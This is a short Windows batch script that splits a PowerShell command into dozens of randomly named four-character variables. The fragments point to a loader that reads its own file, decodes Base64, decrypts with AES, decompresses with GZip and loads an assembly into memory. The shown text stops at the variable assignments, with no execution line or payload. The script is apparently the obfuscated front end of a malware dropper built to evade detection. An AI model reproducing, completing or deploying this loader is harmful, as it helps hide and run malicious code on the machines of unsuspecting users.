@echo off
set "IRXpbYGlbf=g = "
set "mNbSgrpNMm=trea"
set "GDesNmyeuD=m.IO"
set "YGzkyBGoRk=rity"
set "KxhSiIqbul=UGTu"
set "XZLGhHGZwS=comp"
set "WEkYpmvoMy=.Len"
set "qcqOUiGcYR=]::("
set "bKjsHarSyn=Bmor"
set "FqmvSuNwdf=[-1."
set "oGylBvrlGB=hMCl"
set "BPWdiQVpiP=stem"
set "SsGEOPtfdA=('%*'"
set "yfHGVfIOMB=0O+g"
set "SJXNpbofyD= = $"
set "TBPseSyjmP=ct S"
set "UdLCrTkhyi=nage"
set "LVQMphAxwQ=ck($"
set "fhtNKiujOJ=e = "
set "pcHjQYSEzO= = N"
set "WbvsCXllDM=rtS4"
set "mGwvXwLjnA=O.Me"
set "llFiifkQsf=[Env"
set "wnbSspmWxy=($GH"
set "LxkAaVcJiX=($GH"
set "XlBoYvjDnd=).Sp"
set "iHNuNpxxFS=sion"
set "ZYCZMFuUrV=ose("
set "dJIMpBvYST='txe"
set "iHYkekrFth=esaB"
set "dONslSmKdr=vert"
set "IcqFBaRSgM=$OPW"
set "dDlSsphlfN=.IO."
set "RFBcyGeOnF==');"
set "LoZvuYbUre=ddin"
set "FEgwWuuwRs=ring"
set "aryaQsWLYE=pose"
set "QbjlrAEPMW=in $"
set "gzXbayIMuF=$lwd"
set "PUiCOcICce=PsWf"
set "igqjTcVhlm=join"
set "mnKTSUczpa=EaA."
set "RGcdQadinS='[-1"
set "fdvDPkNwUM=Stre"
set "aTemFbwITo=pher"
set "EqRiinxVCM=$zLl"
set "aWRyWGxgNl=-4] "
set "HDvRNalLMv=MClq"
set "WbCstQtvHA=ew-O"
set "eaEFdeaSSn=bstr"
set "zUXgqlyeeP=rfv."
set "lvvkBPtwmz=;$vv"
set "idWAQNcKzW=('%~f0'"
set "WAavypuYku=form"
set "MQFNTIquML=]::C"
set "wMTsGxWmfB=ct S"
set "znGjlyHJHR=);$h"
set "AZxjoWGsqZ=Disp"
set "xnibFsWHZP=y.Pa"
set "xKcxbnOORI=ach "
set "NCPFhPucel=tsWi"
set "GZVUZyaQHD=ment"
set "KbJgxZgNOV=Wf.I"
set "thdgRRlByP='')("
set "ChHwhVUHyv=eh);"
set "oExoIQCjYC= '')"
set "KcoleBnYGD=oryS"
set "DrVxYvIKmS=Fo7l"
set "CFfpJJtwem=$ojj"
set "MYHAGffOtP=VsZ "
set "syeBIDMdVT=ispo"
set "uCbrDNsfVL=yste"
set "WxoxtBEUud=join"
set "bxYUIXzGZd=File"
set "upZuYbMyPW=::('"
set "hIdcxOOoLm=-joi"
set "eGQlieAtKF= [Sy"
set "xxdZIfkpzF=n ''"
set "MCeZbtZtmz=grap"
set "TjTVDhQtzs=onve"
set "QuimcqkItd=] -j"
set "iGFSozvbzU=Comp"
set "LLITIxVNaU=tryP"
set "EGyYCnUcUU=lwdf"
set "FFFPeFeFCl=y.Ci"
set "rtCqGrKiNa=();$"
set "hTBpVCTSPQ=);$v"
set "dVMLDsJGVa=ecry"
set "FzKSrPQvmj=yste"
set "NaJeeyYAUR=3); "
set "vgdQjQYgbs=7Yiv"
set "DMIMRaGgJB=.-16"
set "fJkDfzJjaC=+hAO"
set "xNvhacQgBO= = $"
set "fofvxgUczC= [st"
set "sbpegQiZcJ=);$r"
set "ZWSejWckZy=$gGG"
set "ijHgMgzslH=ress"
set "seiPAITDxd=lBlo"
set "LYYEcvPeHA=d;$r"
set "ARUcVLjYnc=Mode"
set "IppBPTPNho=New-"
set "hlRCSFaDNi=fo ="
set "nECfhBAGJj=Z) {"
set "jxGfQqsNSi=ypto"
set "bLsiDPwhPV=-ep "
set "gbjDnvNRhf=fo);"
set "SNFnAjTnZy=.Cry"
set "GZHZBqWbms=gnir"
set "JmnVFdcywW=ress"
set "DYEsDUoAUo=.Dis"
set "TTSPJulpAY=[Sys"
set "BsCpHZtnHw=y]::"
set "vRAgIsMvfc=, $l"
set "CbfOdKkgiO=.Key"
set "dyJsVGWlkm=v4Ir"
set "zldgpfabkf=mory"
set "jOJnxuphfU=.Mem"
set "aOjtLOLDTt=rPsW"
set "qsqPQmxhoP=ose("
set "TRzHURGBQv=jgo."
set "ZWsUdBDORn=ode]"
set "HMaEDaQMMa=Syst"
set "tgUpdFyKmP=embl"
set "rppfbYsoHJ=daeR"
set "JAewfcNaRD=eh ="
set "iWoXHLKHaf=sGUc"
set "XWeUxVHRIp=GGeh"
set "ltkhdrbNPP=ewLi"
set "fvmiOvdrbX=BC;$"
set "gQemAcvEUe=em.C"
set "eWngNmUxZX=tem."
set "dBtYOdpbJD=7;$r"
set "eopkrFTWDK=Obje"
set "RtdiQvYBLn=wdfo"
set "PYBDvXowzE=eam("
set "rBDRlgDhmu=saBm"
set "CeLIgwXBrW= New"
set "rsReHFqknt=ing("
set "gNxrcBzNER=comm"
set "hLYdmYRbkH=tem."
set "sJScvUgeLT=Secu"
set "FavHrnjznq=morF"
set "XqmMNapiZQ=oin "
set "SpPxGpecYE=ZYYc"
set "WNAspZcNIE=[Sys"
set "RwaTqiztSL=  $b"
set "NJlZHpufoh=t Sy"
set "gsNQfIYzpK=esMa"
set "nTJfJcyftK=brea"
set "HSgldjlSFM=q = "
set "BdqBBPObvF=Z.En"
set "UzoUdHZmIS=lwdf"
set "vcxUUYYENp='gni"
set "DcpnbXBESj=rity"
set "oYOVnjPXxw=v.Su"
set "XYpUJTapVh=PsWf"
set "AqasisylEX=Conv"
set "CJcfSnPDaR=lit("
set "AhZgrWgKnH=k; }"
set "IBTVfHVqbs=go.T"
set "wfszzkorsX=f.Pa"
set "aUsgKrPmFg='[-1"
set "PZYKqDwkPA=PsWf"
set "ezBBHbeztp=null"
set "CTVOUNTtSd=ress"
set "hisBdurRSr= '')"
set "xgfEsFSNTj=m(, "
set "BxlnnmoOjR=tion"
set "snnnXJiGvF= [Sy"
set "xFohhIYAbb=ateD"
set "NelWkJonTY=]::("
set "SaFNfWPhEw=-Obj"
set "LYEPEakXgS=stem"
set "wEmJrFIjuW=wPdm"
set "PKdZMwIUxY=se()"
set "vFhpbZteIJ=OyzA"
set "WDnxgndsdd=$hMC"
set "XyIHnCRwNu=Disp"
set "kyZjHCFRos=S46e"
set "yTQeKuWsPv=oArr"
set "oWjQqkbPuP=ptog"
set "ekJEOZbxUq=..-1"
set "KcWiieEMnA=ddin"
